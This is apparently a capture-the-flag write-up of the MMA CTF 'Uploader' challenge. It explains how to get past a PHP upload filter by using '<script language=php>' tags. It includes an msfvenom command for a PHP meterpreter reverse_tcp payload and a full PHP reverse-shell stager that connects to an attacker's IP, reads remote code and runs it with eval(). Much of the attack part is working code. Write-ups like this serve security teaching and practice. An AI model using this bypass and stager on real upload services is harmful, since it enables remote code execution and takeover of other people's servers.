# MMA : Uploader

#### Author: Wh1t3Fox

**Description**:
> This uploader deletes all */<\?|php/*. So you cannot run php.
>
> * http://recocta.chal.mmactf.link:9080/
> * http://recocta.chal.mmactf.link:9081/ (Mirror 1)
> * http://recocta.chal.mmactf.link:9082/ (Mirror 2)
> * http://recocta.chal.mmactf.link:9083/ (Mirror 3)
>
> You can only upload files whose name is matched by */^[a-zA-Z0-9]+\.[a-zA-Z0-9]+$/*.

Now the uploader allows us to upload any file type as long as it meets the regex above.

According to [PHP Manual](http://php.net/manual/en/language.basic-syntax.phpmode.php) to execute PHP it is possible to use:

    <script language="php"></script>

instead of

    <?php ?>

Now I must admit I have no clue that this was even possible and did get some help to reach this point. *h/t to a0xnirudh*

Now we know how to execute PHP on the server we have to come up with some backdoor we can upload to the server and get a shell. This is where I turned to [Metasploit](http://www.metasploit.com/).  To generate the payload I used msfvenom.

    msfvenom -p php/meterprete/reverse_tcp LHOST=<PUB_IP> LPORT=9000 -f raw > shell.php

Once I opened the port 9000 on iptables, and setup port forwarding on my router I was ready to start my listener. To do this I launched *msfconsole*, and setup the following information:

![msfconsole setup][setup]

Now we proceed to upload our exploit to the server, and when we view the file we get an instant meterpreter session on the server.

![meterpreter session][meterpreter]

The next step is finding the flag. After looking in the local directory I could tell that those were just files being uploaded and the flag was not there.

![pwd ls][ls]

I started to back out of the directory and ended up finding a file in the root directory called flag and viewing it gave us the flag!

![cat flag][flag]

(Yes, I could've just passed commands through GET requests and I started to do so, but who doesn't like getting a shell? (: )

**PAYLOAD**

    <script language="phP">
        error_reporting(0);
        $ip = '<PUB_IP>';
        $port = 9000;
        if (($f = 'stream_socket_client') && is_callable($f)) {
            $s = $f("tcp://{$ip}:{$port}");
            $s_type = 'stream';
        } elseif (($f = 'fsockopen') && is_callable($f)) {
            $s = $f($ip, $port);
            $s_type = 'stream';
        } elseif (($f = 'socket_create') && is_callable($f)) {
            $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
            $res = @socket_connect($s, $ip, $port);
            if (!$res) { die(); }
            $s_type = 'socket';
        } else { die('no socket funcs'); }
        if (!$s) { die('no socket'); }
        switch ($s_type) {
            case 'stream':
                $len = fread($s, 4);
                break;
            case 'socket':
                $len = socket_read($s, 4);
                break;
        }
        if (!$len) { die(); }
        $a = unpack("Nlen", $len);
        $len = $a['len']; $b = '';
        while (strlen($b) < $len) {
            switch ($s_type) {
                case 'stream':
                    $b .= fread($s, $len-strlen($b));
                    break;
                case 'socket':
                    $b .= socket_read($s, $len-strlen($b));
                    break;
            }
        }
        $GLOBALS['msgsock'] = $s;
        $GLOBALS['msgsock_type'] = $s_type;
        eval($b);
        die();
    </script>


[setup]: http://i.imgur.com/3jOki3G.png
[meterpreter]: http://i.imgur.com/i7b9TLx.png
[ls]: http://i.imgur.com/01epdzt.png
[flag]: http://i.imgur.com/nbrXrVd.png
